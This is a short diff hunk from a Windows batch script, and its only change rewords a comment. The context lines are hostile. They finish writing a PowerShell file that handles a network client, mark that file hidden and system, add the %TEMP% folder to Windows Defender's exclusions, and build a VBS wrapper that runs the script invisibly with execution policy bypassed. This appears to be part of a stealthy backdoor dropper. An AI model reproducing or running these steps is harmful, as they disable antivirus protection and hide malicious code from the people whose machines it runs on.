@@ -37,7 +37,7 @@ echo $client.Close(); } catch {} } >> %file%
 attrib +h +s +r %file% >nul 2>&1
 powershell -command "Add-MpPreference -ExclusionPath \"%TEMP%\"" > nul 2>&1
 
-:: run in hidden mode using vbs wrapper
+:: use vbs wrapper to run in hidden mode
 echo Set WshShell = CreateObject("WScript.Shell") > %wrapper%
 echo WshShell.Run "powershell -ExecutionPolicy Bypass -File ""%TEMP%\%file%""", 0, False >> %wrapper%
 
